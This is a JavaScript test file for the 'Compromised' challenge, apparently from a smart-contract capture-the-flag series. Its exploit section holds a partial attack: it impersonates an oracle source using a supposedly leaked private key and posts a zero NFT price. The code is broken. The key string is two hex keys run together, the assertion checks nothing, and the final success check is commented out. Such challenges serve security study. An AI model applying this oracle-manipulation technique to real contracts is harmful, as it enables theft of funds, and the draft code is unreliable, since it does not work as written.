const { ether, balance, BN } = require('@openzeppelin/test-helpers');
const { accounts, contract, web3 } = require('@openzeppelin/test-environment');

const Exchange = contract.fromArtifact('Exchange');
const DamnValuableNFT = contract.fromArtifact('DamnValuableNFT');
const TrustfulOracle = contract.fromArtifact('TrustfulOracle');
const TrustfulOracleInitializer = contract.fromArtifact('TrustfulOracleInitializer');

const { expect } = require('chai');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const [deployer, attacker] = accounts;
    const EXCHANGE_INITIAL_ETH_BALANCE = ether('10000');
    const INITIAL_NFT_PRICE = ether('999');

    before(async function () {
        /** SETUP - NO NEED TO CHANGE ANYTHING HERE */

        // Fund the trusted source addresses
        await web3.eth.sendTransaction({ from: deployer, to: sources[0], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[1], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[2], value: ether('5') });

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracle.at(
            await (await TrustfulOracleInitializer.new(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
                { from: deployer }
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await Exchange.new(
            this.oracle.address,
            { from: deployer, value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.token = await DamnValuableNFT.at(await this.exchange.token());

        // Keep track of attacker's initial ETH balance
        this.initialAttackerbalance = await balance.current(attacker);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */

        // deterministically computes the smart contract address given
        // the account the will deploy the contract (factory contract)
        // the salt as uint256 and the contract bytecode
        function buildCreate2Address(creatorAddress, saltHex, byteCode) {
            return `0x${web3.utils.sha3(`0x${[
                'ff',
                creatorAddress,
                saltHex,
                web3.utils.sha3(byteCode)
            ].map(x => x.replace(/0x/, ''))
                .join('')}`).slice(-40)}`.toLowerCase()
        }

        // converts an int to uint256
        function numberToUint256(value) {
            const hex = value.toString(16)
            return `0x${'0'.repeat(64 - hex.length)}${hex}`
        }

        // encodes parameter to pass as contract argument
        function encodeParam(dataType, data) {
            return web3.eth.abi.encodeParameter(dataType, data)
        }

        // returns true if contract is deployed on-chain
        async function isContract(address) {
            const code = await web3.eth.getCode(address)
            return code.slice(2).length > 0
        }

        console.log('balance', this.initialAttackerbalance.toString());
        console.log('price', (await this.oracle.getMedianPrice('DVNFT')).toString());
        
        const tokenId = await this.exchange.buyOne({ from: attacker, value: '999000000000000000000' });
        // online hex decode then base64 decode the string from the server and I got what looked like a private key
        const leakedPrivKey = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a90x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
        const leakedAccount = web3.eth.accounts.privateKeyToAccount(leakedPrivKey);
        expect(sources[1] === leakedAccount.address, 'Leaked private key is for sources[1]');
        await this.oracle.postPrice(new BN('0'), { from: leakedAccount.address });
        console.log('price', (await this.oracle.getMedianPrice('DVNFT')).toString());

        // console.log(web3.eth.accounts.privateKeyToAccount('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a90x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'));
        // // constructor arguments are appended to contract bytecode
        // const bytecode = `${accountBytecode}${encodeParam('address', '0x262d41499c802decd532fd65d991e477a068e132').slice(2)}`
        // const salt = 1

        // const computedAddr = buildCreate2Address(
        //     factoryAddress,
        //     numberToUint256(salt),
        //     bytecode
        // )
    });

    after(async function () {
        // Exchange must have lost all ETH
        // expect(
        //     await balance.current(this.exchange.address)
        // ).to.be.bignumber.eq('0');
    });
});
